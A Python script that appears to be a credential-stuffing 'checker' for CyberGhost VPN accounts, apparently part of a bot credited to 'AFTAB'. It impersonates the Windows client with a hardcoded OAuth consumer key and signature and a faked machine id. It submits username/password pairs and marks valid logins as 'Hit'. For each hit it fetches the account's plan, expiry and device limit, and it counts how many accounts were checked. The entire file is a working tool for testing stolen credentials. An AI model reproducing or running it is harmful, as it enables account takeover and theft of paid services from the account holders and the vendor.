import hashlib
import random
import string
import requests
import time

def get_random_ua():
    # Function to get a random user agent
    # Placeholder implementation; should be replaced with actual logic to get a random UA
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
    return ua

def hash_md5(input_string):
    # Function to hash input_string using MD5
    return hashlib.md5(input_string.encode()).hexdigest()

def generate_guid():
    # Function to generate a GUID
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=32))

def to_uppercase(input_string):
    # Function to convert input_string to uppercase
    return input_string.upper()

def check_gpt(user, password):
    ua = get_random_ua()
    id_hash = hash_md5(ua)
    guid = generate_guid()
    upper_guid = to_uppercase(guid)

    url = "https://api.cyberghostvpn.com/cg/oauth/access_token?flags=0&os=win&os_version=10.0.19045&app_version=8.4.7.14153&app_language=en&os_region=us&environment=Live&affiliate=&partners_id=1"
    
    payload = {
        "x_auth_machineid": id_hash,
        "x_auth_machinename": "SM-G965N",
        "x_auth_password": password,
        "x_auth_username": user,
        "x_auth_mode": "client_auth"
    }
    
    headers = {
        "Authorization": 'OAuth realm="api.cyberghostvpn.com", oauth_version="1.0", oauth_timestamp="1719838888", oauth_signature_method="PLAINTEXT", oauth_consumer_key="45d3fdd1635601b1c28a3d2f1d78d83e1c7edbb4", oauth_signature="b97627f1c114d6b5eb567aa70b956001da3e5eea%26"',
        "Content-Type": "application/json",
        "User-Agent": "CG8Win (8.4.7.14153)",
        "Host": "api.cyberghostvpn.com",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive"
    }

    response = requests.post(url, json=payload, headers=headers, allow_redirects=False)

    # Check for key conditions
    if response.status_code == 500 or "error code: 1020" in response.text:
        return "Dead", "Server responded with 500 or error code: 1020"

    if "USER NOT FOUND OR WRONG PASSWORD!" in response.text:
        return "Dead", "USER NOT FOUND OR WRONG PASSWORD!"

    if response.status_code == 200:
        response_data = response.json()
        token = response_data.get("oauth_token")
        secret = response_data.get("oauth_token_secret")
        
        if token and secret:
            user_info_url = "https://api.cyberghostvpn.com/cg/users/me?flags=0&os=win&os_version=10.0.19045&app_version=8.4.7.14153&app_language=en&os_region=us&environment=Live&affiliate=&partners_id=1"
            headers["Authorization"] = f'OAuth oauth_version="1.0", oauth_signature_method="PLAINTEXT", oauth_consumer_key="45d3fdd1635601b1c28a3d2f1d78d83e1c7edbb4", oauth_signature="b97627f1c114d6b5eb567aa70b956001da3e5eea%26{secret}", oauth_token="{token}"'
            
            user_info_response = requests.get(user_info_url, headers=headers, allow_redirects=False)
            user_info_data = user_info_response.json()
            
            plan_name = user_info_data.get("plan")
            expiry = user_info_data.get("enddate")
            days_left = user_info_data.get("days_left")
            trial = user_info_data.get("hasPaidTrial")
            renew = user_info_data.get("recurring")
            max_devices = user_info_data.get("max_devices")
            
            response_message = (
                f"Plan Name: {plan_name}\n"
                f"Expiry: {expiry}\n"
                f"Days Left: {days_left}\n"
                f"Trial: {trial}\n"
                f"Renew: {renew}\n"
                f"Max Devices: {max_devices}\n"
            )
            
            return "Hit", response_message
        else:
            return "Dead", "Token or secret not found in the response."
    else:
        return "Dead", f"Request failed with status code {response.status_code} and message: {response.text}"

def get_footer_info(total_accounts, start_time, username):
    elapsed_time = time.time() - start_time
    footer = (
        f"－－－－－－－－－－－－－－－－\n"
        f"🔹 Total Accounts Checked - {total_accounts}\n"
        f"⏱️ Time Taken - {elapsed_time:.2f} seconds\n"
        f"▫️ Checked by: {username}\n"
        f"⚡️ Bot by - AFTAB 👑\n"
        f"－－－－－－－－－－－－－－－－"
    )
    return footer
